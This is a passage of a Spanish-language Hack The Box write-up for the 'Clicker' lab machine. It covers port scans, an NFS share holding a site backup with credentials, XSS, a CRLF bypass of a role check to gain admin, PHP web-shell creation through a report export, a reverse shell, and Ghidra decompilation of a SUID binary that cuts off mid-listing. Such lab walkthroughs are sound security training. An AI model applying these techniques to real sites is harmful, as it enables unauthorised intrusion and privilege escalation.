<!doctype html>
<html lang="es-ES"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <title>Bajo el Teclado</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="" />

    
    
    
    <link rel="stylesheet" href="../../css/theme.min.css">

    
    
    

    
  


</head>
<body>
        <div id="content" class="mx-auto"><header class="container mt-sm-5 mt-4 mb-4 mt-xs-1">
    <div class="row">
        
        <div class="col-sm-4 col-12 text-sm-right text-center pt-sm-4">
            <a href="../../" class="text-decoration-none">
                <img id="home-image" class="rounded-circle"
                    
                        
                            src="../../pointed.jpeg"
                        
                    
                />
            </a>
        </div>
        <div class="col-sm-8 col-12 text-sm-left text-center">
        
            <h2 class="m-0 mb-2 mt-4">
                <a href="../../" class="text-decoration-none">
                    
                        pointedsec
                    
                </a>
            </h2>
            <p class="text-muted mb-1">
                
                    if pentester.found == bug { make(pentester,states.happy) }
                
            </p>
            <ul id="nav-links" class="list-inline mb-2">
                
                
                    <li class="list-inline-item">
                        <a class="badge badge-white " href="../../" title="Home">/Home</a>
                    </li>
                
                    <li class="list-inline-item">
                        <a class="badge badge-white " href="../../about/" title="About">About</a>
                    </li>
                
                    <li class="list-inline-item">
                        <a class="badge badge-white " href="../../writeups/" title="Write-Up&#39;s">Write-Up&#39;s</a>
                    </li>
                
            </ul>
            <ul id="nav-social" class="list-inline">
                
                    <li class="list-inline-item mr-3">
                        <a href="http://github.com/pointedsec" target="_blank">
                            <i class="fab fa-github fa-1x text-muted"></i>
                        </a>
                    </li>
                
                    <li class="list-inline-item mr-3">
                        <a href="https://www.linkedin.com/in/andr%C3%A9s-del-cerro-rodr%C3%ADguez-13a826293/" target="_blank">
                            <i class="fab fa-linkedin-in fa-1x text-muted"></i>
                        </a>
                    </li>
                
                    <li class="list-inline-item mr-3">
                        <a href="mailto:adelcerrorodriguez@gmail.com" target="_blank">
                            <i class="fas fa-at fa-1x text-muted"></i>
                        </a>
                    </li>
                
                    <li class="list-inline-item mr-3">
                        <a href="https://pointedsec.vercel.app" target="_blank">
                            <i class="fas fa-globe fa-1x text-muted"></i>
                        </a>
                    </li>
                
                    <li class="list-inline-item mr-3">
                        <a href="https://app.hackthebox.com/profile/1575364" target="_blank">
                            <i class="fas fa-box fa-1x text-muted"></i>
                        </a>
                    </li>
                
            </ul>
        </div>
    </div>
    <hr />
</header>
<div class="container">
    <div class="pl-sm-4 ml-sm-5">
        <h1 id="hack-the-box-clicker-writeup">Hack The Box: Clicker Writeup</h1>
<p>Welcome to my detailed writeup of the medium difficulty machine <strong>&ldquo;Clicker&rdquo;</strong> on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.</p>
<h1 id="tcp-enumeration">TCP Enumeration</h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ rustscan -a 10.129.244.53 --ulimit <span style="color:#ae81ff">5000</span> -g
</span></span><span style="display:flex;"><span>10.129.244.53 -&gt; <span style="color:#f92672">[</span>22,80,111,2049,34153,44465,45613,59011<span style="color:#f92672">]</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nmap -p22,80,111,2049,34153,44465,45613,59011 -sCV 10.129.244.53 -oN allPorts
</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-08-13 19:16 CEST
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.244.53
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.037s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PORT      STATE SERVICE  VERSION
</span></span><span style="display:flex;"><span>22/tcp    open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 89:d7:39:34:58:a0:ea:a1:db:c1:3d:14:ec:5d:5a:92 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> b4:da:8d:af:65:9c:bb:f0:71:d5:13:50:ed:d8:11:30 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>80/tcp    open  http     Apache httpd 2.4.52 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.52 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://clicker.htb/
</span></span><span style="display:flex;"><span>111/tcp   open  rpcbind  2-4 <span style="color:#f92672">(</span>RPC <span style="color:#75715e">#100000)</span>
</span></span><span style="display:flex;"><span>| rpcinfo: 
</span></span><span style="display:flex;"><span>|   program version    port/proto  service
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100000</span>  2,3,4        111/tcp   rpcbind
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100000</span>  2,3,4        111/udp   rpcbind
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100000</span>  3,4          111/tcp6  rpcbind
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100000</span>  3,4          111/udp6  rpcbind
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100003</span>  3,4         2049/tcp   nfs
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100003</span>  3,4         2049/tcp6  nfs
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100005</span>  1,2,3      50307/tcp6  mountd
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100005</span>  1,2,3      56563/udp6  mountd
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100005</span>  1,2,3      58331/udp   mountd
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100005</span>  1,2,3      59011/tcp   mountd
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100021</span>  1,3,4      34153/tcp   nlockmgr
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100021</span>  1,3,4      37231/tcp6  nlockmgr
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100021</span>  1,3,4      43295/udp   nlockmgr
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100021</span>  1,3,4      57855/udp6  nlockmgr
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100024</span>  <span style="color:#ae81ff">1</span>          43849/tcp6  status
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100024</span>  <span style="color:#ae81ff">1</span>          45440/udp   status
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100024</span>  <span style="color:#ae81ff">1</span>          45613/tcp   status
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100024</span>  <span style="color:#ae81ff">1</span>          49433/udp6  status
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100227</span>  <span style="color:#ae81ff">3</span>           2049/tcp   nfs_acl
</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">100227</span>  <span style="color:#ae81ff">3</span>           2049/tcp6  nfs_acl
</span></span><span style="display:flex;"><span>2049/tcp  open  nfs_acl  <span style="color:#ae81ff">3</span> <span style="color:#f92672">(</span>RPC <span style="color:#75715e">#100227)</span>
</span></span><span style="display:flex;"><span>34153/tcp open  nlockmgr 1-4 <span style="color:#f92672">(</span>RPC <span style="color:#75715e">#100021)</span>
</span></span><span style="display:flex;"><span>44465/tcp open  mountd   1-3 <span style="color:#f92672">(</span>RPC <span style="color:#75715e">#100005)</span>
</span></span><span style="display:flex;"><span>45613/tcp open  status   <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>RPC <span style="color:#75715e">#100024)</span>
</span></span><span style="display:flex;"><span>59011/tcp open  mountd   1-3 <span style="color:#f92672">(</span>RPC <span style="color:#75715e">#100005)</span>
</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 10.86 seconds
</span></span></code></pre></div><h1 id="udp-enumeration">UDP Enumeration</h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo nmap --top-ports <span style="color:#ae81ff">1500</span> -sU --min-rate <span style="color:#ae81ff">5000</span> -n -Pn 10.129.244.53 -oN allPorts.UDP
</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-08-13 19:17 CEST
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.244.53
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.037s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">1493</span> open|filtered udp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT      STATE  SERVICE
</span></span><span style="display:flex;"><span>111/udp   open   rpcbind
</span></span><span style="display:flex;"><span>998/udp   closed puparp
</span></span><span style="display:flex;"><span>17205/udp closed unknown
</span></span><span style="display:flex;"><span>21111/udp closed unknown
</span></span><span style="display:flex;"><span>26191/udp closed unknown
</span></span><span style="display:flex;"><span>31520/udp closed unknown
</span></span><span style="display:flex;"><span>55544/udp closed unknown
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 1.22 seconds
</span></span></code></pre></div><p>En el servicio web del puerto 80 vemos una redirección a <code>clicker.htb</code> , lo agregamos al <code>/etc/hosts</code></p>
<h1 id="nfs-enumeration">NFS Enumeration</h1>
<p>Interesante que se encuentre el NFS abierto, ya que me pareció extraño vamos a enumerarlo lo primero.</p>
<p>Primero vamos a montar todo lo que se encuentre en el servidor.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo mount -t nfs 10.129.244.53:/ /mnt/montura
</span></span><span style="display:flex;"><span>┌─<span style="color:#f92672">[</span>192.168.1.52<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>pointedsec@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~/Desktop/clicker/scan<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└──╼ <span style="color:#f92672">[</span>★<span style="color:#f92672">]</span>$ ls -la /mnt/montura
</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">18</span> root root <span style="color:#ae81ff">4096</span> sep  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2023</span> .
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">14</span> ago <span style="color:#ae81ff">13</span> 19:20 ..
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">3</span> root root <span style="color:#ae81ff">4096</span> sep  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2023</span> mnt
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ find . -type f
</span></span><span style="display:flex;"><span>./mnt/backups/clicker.htb_backup.zip
</span></span></code></pre></div><p>Solo vemos un archivo .zip</p>
<p><img src="images/Screenshot_1.png" alt="Write-up Image">
Contiene lo que parece archivos de un sitio web.</p>
<p>Analizando los archivos encontramos unas credenciales que quizás nos sirvan.
<img src="images/Screenshot_2.png" alt="Write-up Image"></p>
<p><code>clicker_db_user:clicker_db_password</code></p>
<p>Todavía no quiero meterme a analizar el código mas profundamente, primero vamos a ver la funcionalidad del aplicativo.</p>
<h1 id="http-enumeration">HTTP Enumeration</h1>
<h2 id="multiple-xss">Multiple XSS</h2>
<p>Así se ve el sitio web, parece una especie de juego en el navegador.
<img src="images/Screenshot_3.png" alt="Write-up Image"></p>
<p>Vemos que podemos visualizar mi perfil. Quizás se pueda acontecer un XSS aquí.
<img src="images/Screenshot_4.png" alt="Write-up Image"></p>
<p>Vemos que este es el juego, se basa en dar clicks y ir subiendo de nivele
<img src="images/Screenshot_5.png" alt="Write-up Image"></p>
<p>Al guardar la partida podemos manipular el mensaje de guardado y se produce un XSS.
<img src="images/Screenshot_6.png" alt="Write-up Image"></p>
<p>Vemos que para guardar la partida se hace una petición GET al recurso <code>save_game.php</code> y mediante los query params <code>clicks</code> y <code>level</code> indicamos el progreso.
<img src="images/Screenshot_7.png" alt="Write-up Image"></p>
<p>Haciendo una petición a <code>http://clicker.htb/save_game.php?clicks=120&amp;level=120</code> vemos que se guarda el progreso, así que podemos modificar el progreso a nuestro gusto.</p>
<p><img src="images/Screenshot_9.png" alt="Write-up Image"></p>
<p>Al autenticarnos erróneamente también podemos modificar el mensaje informativo y se acontece otro XSS.
<img src="images/Screenshot_8.png" alt="Write-up Image"></p>
<h1 id="discovering-sql-injection--mass-assignment-vulnerability">Discovering SQL Injection | Mass Assignment Vulnerability</h1>
<p>Si introducimos una <code>'</code> como clicks y niveles vemos que el servidor responde con un estado de error 500. Puede que este end-point sea vulnerable a SQL Injection. Como tenemos el código podemos revisarlo.
<img src="images/Screenshot_10.png" alt="Write-up Image"></p>
<p>Al revisar el código de <code>save_game.php</code> me encontré con algo mucho mas interesante.</p>
<p>Este código recorre todos parámetros y los pasa a una función que hará un <code>UPDATE</code> utilizando como campo a actualizar el parámetro que le pasemos. Pero tiene una pequeña protección para no poder cambiar el <code>role</code>
<img src="images/Screenshot_11.png" alt="Write-up Image">
<img src="images/Screenshot_12.png" alt="Write-up Image"></p>
<p>Vemos que por defecto el rol establecido a los usuarios es <code>User</code> , así que supongo que existirá el rol <code>Admin</code> o <code>Administrator</code>
<img src="images/Screenshot_13.png" alt="Write-up Image"></p>
<p>En principio no podemos modificar el rol pero si otros campos, eso es interesante.</p>
<p>Cambiando el <code>username</code> podemos conseguir otro XSS
<img src="images/Screenshot_14.png" alt="Write-up Image"></p>
<p>Cambiando el campo <code>nickname</code> y posteriormente revisando nuestro perfil también.
<img src="images/Screenshot_15.png" alt="Write-up Image"></p>
<p>Como alcancé un punto donde no encontraba nada, me puse a investigar sobre la condición para poder cambiar mi rol de usuario.</p>
<h1 id="crlf-injection">CRLF Injection</h1>
<p>Me encontré <a href="https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a">este artículo en Hacktricks</a></p>
<p>E inyectando un retorno de carro realmente no afectaría a la consulta SQL ya que a parte de que está sanitizada, se seguiría interpretando, pero ya no cumpliría la condición de que <code>%0d%arole === 'role'</code>
<img src="images/Screenshot_16.png" alt="Write-up Image"></p>
<p>Y nos hemos convertido administradores.
<img src="images/Screenshot_17.png" alt="Write-up Image"></p>
<p>Vemos una función para exportar una especie de reporte de los mejores jugadores.
<img src="images/Screenshot_18.png" alt="Write-up Image"></p>
<p>Así es como se ve el reporte.
<img src="images/Screenshot_19.png" alt="Write-up Image"></p>
<h1 id="foothold">Foothold</h1>
<p>Y revisando el código de <code>export.php</code> descubrí una cosa crítica, y es que podemos controlar la extensión mediante el parámetro <code>extension</code>. Por lo cual..
<img src="images/Screenshot_20.png" alt="Write-up Image">
Podemos interceptar la petición con <code>burpsuite</code> y modificar el parámetro <code>extension</code> para establecer que queremos guardar un archivo php.
<img src="images/Screenshot_21.png" alt="Write-up Image"></p>
<p>Y vaya&hellip; Podemos crear archivos PHP.
<img src="images/Screenshot_22.png" alt="Write-up Image"></p>
<p>Ahora, si recordamos, podemos modificar cualquier campo mediante el recurso <code>save_game.php</code>&hellip;</p>
<p>El vector de ataque es editar el <code>nickname</code> de un usuario introduciendo un código PHP, para después crear un reporte en el que modificaremos la extensión para que sea PHP e interprete el código inyectado en el campo <code>nickname</code> y así conseguir ejecución remota de comandos.</p>
<p>Por lo cual, cambiamos el <code>nickname</code> para ver si nos carga el phpinfo.
<img src="images/Screenshot_23.png" alt="Write-up Image"></p>
<p>Creamos el reporte modificando la extensión..
<img src="images/Screenshot_25.png" alt="Write-up Image"></p>
<p>Y podemos crear nuestro propio archivo PHP, así que vamos a crear una web shell.
<img src="images/Screenshot_24.png" alt="Write-up Image"></p>
<p>Cambiamos el nickname&hellip;
<img src="images/Screenshot_26.png" alt="Write-up Image"></p>
<p>¡Y tenemos ejecución remota de comandos!
<img src="images/Screenshot_27.png" alt="Write-up Image"></p>
<p>Podemos comprobar que no estamos en ningún contenedor.
<img src="images/Screenshot_28.png" alt="Write-up Image"></p>
<p>Y con <code>pwncat-cs</code> nos podemos poner en escucha por el puerto 443 y mandarnos la revshell.</p>
<p><img src="images/Screenshot_29.png" alt="Write-up Image"></p>
<p><img src="images/Screenshot_30.png" alt="Write-up Image"></p>
<p>Todavía no podemos ver la flag, vemos que hay un usuario llamado <code>jack</code>
<img src="images/Screenshot_31.png" alt="Write-up Image"></p>
<h2 id="user-pivoting">User Pivoting</h2>
<p>Buscando por binarios con permisos SUID encontramos un binario un tanto extraño</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">(</span>remote<span style="color:#f92672">)</span> www-data@clicker:/var/www/clicker.htb/exports$ find / <span style="color:#ae81ff">\-</span>perm -4000 2&gt;/dev/null
</span></span><span style="display:flex;"><span>/usr/bin/sudo
</span></span><span style="display:flex;"><span>/usr/bin/chsh
</span></span><span style="display:flex;"><span>/usr/bin/gpasswd
</span></span><span style="display:flex;"><span>/usr/bin/fusermount3
</span></span><span style="display:flex;"><span>/usr/bin/su
</span></span><span style="display:flex;"><span>/usr/bin/umount
</span></span><span style="display:flex;"><span>/usr/bin/newgrp
</span></span><span style="display:flex;"><span>/usr/bin/chfn
</span></span><span style="display:flex;"><span>/usr/bin/passwd
</span></span><span style="display:flex;"><span>/usr/bin/mount
</span></span><span style="display:flex;"><span>/usr/lib/openssh/ssh-keysign
</span></span><span style="display:flex;"><span>/usr/lib/dbus-1.0/dbus-daemon-launch-helper
</span></span><span style="display:flex;"><span>/usr/libexec/polkit-agent-helper-1
</span></span><span style="display:flex;"><span>/usr/sbin/mount.nfs
</span></span><span style="display:flex;"><span>/opt/manage/execute_query
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">(</span>remote<span style="color:#f92672">)</span> www-data@clicker:/var/www/clicker.htb/exports$ ls -la /opt/manage/execute_query
</span></span><span style="display:flex;"><span>-rwsrwsr-x <span style="color:#ae81ff">1</span> jack jack <span style="color:#ae81ff">16368</span> Feb <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2023</span> /opt/manage/execute_query
</span></span></code></pre></div><p>Vemos que pertenece a <code>jack</code></p>
<p>Podemos echar un vistazo con <code>ghidra</code> a este binario.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>undefined8 <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> param_1,<span style="color:#66d9ef">long</span> param_2)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar1;
</span></span><span style="display:flex;"><span>  undefined8 uVar2;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>pcVar3;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">size_t</span> sVar4;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">size_t</span> sVar5;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>__dest;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> in_FS_OFFSET;
</span></span><span style="display:flex;"><span>  undefined8 local_98;
</span></span><span style="display:flex;"><span>  undefined8 local_90;
</span></span><span style="display:flex;"><span>  undefined4 local_88;
</span></span><span style="display:flex;"><span>  undefined8 local_78;
</span></span><span style="display:flex;"><span>  undefined8 local_70;
</span></span><span style="display:flex;"><span>  undefined8 local_68;
</span></span><span style="display:flex;"><span>  undefined8 local_60;
</span></span><span style="display:flex;"><span>  undefined8 local_58;
</span></span><span style="display:flex;"><span>  undefined8 local_50;
</span></span><span style="display:flex;"><span>  undefined8 local_48;
</span></span><span style="display:flex;"><span>  undefined8 local_40;
</span></span><span style="display:flex;"><span>  undefined8 local_38;
</span></span><span style="display:flex;"><span>  undefined8 local_30;
</span></span><span style="display:flex;"><span>  undefined local_28;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> local_20;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  local_20 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(in_FS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (param_1 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;ERROR: not enough arguments&#34;</span>);
</span></span><span style="display:flex;"><span>    uVar2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">atoi</span>(<span style="color:#f92672">*</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>)(param_2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>));
</span></span><span style="display:flex;"><span>    pcVar3 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">calloc</span>(<span style="color:#ae81ff">0x14</span>,<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">switch</span>(iVar1) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;ERROR: Invalid arguments&#34;</span>);
</span></span><span style="display:flex;"><span>      uVar2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">goto</span> LAB_001015e1;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">strncpy</span>(pcVar3,<span style="color:#e6db74">&#34;create.sql&#34;</span>,<span style="color:#ae81ff">0x14</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">strncpy</span>(pcVar3,<span style="color:#e6db74">&#34;populate.sql&#34;</span>,<span style="color:#ae81ff">0x14</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">3</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">strncpy</span>(pcVar3,<span style="color:#e6db74">&#34;reset_password.sql&#34;</span>,<span style="color:#ae81ff">0x14</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">4</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">strncpy</span>(pcVar3,<span style="color:#e6db74">&#34;clean.sql&#34;</span>,<span style="color:#ae81ff">0x14</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">strncpy</span>(pcVar3,<span style="color:#f92672">*</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>)(param_2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>),<span style="color:#ae81ff">0x14</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    local_98 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x616a2f656d6f682f</span>;
</span></span><span style="display:flex;"><span>    local_90 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x69726575712f6b63</span>;
</span></span><span style="display:flex;"><span>    local_88 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x2f7365</span>;
</span></span><span style="display:flex;"><span>    sVar4 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>local_98);
</span></span><span style="display:flex;"><span>    sVar5 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(pcVar3);
</span></span><span style="display:flex;"><span>    __dest <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">calloc</span>(sVar5 <span style="color:#f92672">+</span> sVar4 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">strcat</span>(__dest,(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>local_98);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">strcat</span>(__dest,pcVar3);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">setreuid</span>(<span style="color:#ae81ff">1000</span>,<span style="color:#ae81ff">1000</span>);
</span></span><span style="display:flex;"><span>    iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">access</span>(__dest,<span style="color:#ae81ff">4</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (iVar1 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>      local_78 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x6e69622f7273752f</span>;
</span></span><span style="display:flex;"><span>      local_70 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x2d206c7173796d2f</span>;
</span></span><span style="display:flex;"><span>      local_68 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x656b63696c632075</span>;
</span></span><span style="display:flex;"><span>      local_60 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x6573755f62645f72</span>;
</span></span><span style="display:flex;"><span>      local_58 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x737361702d2d2072</span>;
</span></span><span style="display:flex;"><span>      local_50 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x6c63273d64726f77</span>;
</span></span><span style="display:flex;"><span>      local_48 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x62645f72656b6369</span>;
</span></span><span style="display:flex;"><span>      local_40 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x726f77737361705f</span>;
</span></span><span style="display:flex;"><span>      local_38 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x6b63696c63202764</span>;
</span></span><span style="display:flex;"><span>      local_30 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x203c20762d207265</span>;
</span></span><span style="display:flex;"><span>      local_28 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>      sVar4 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>local_78);
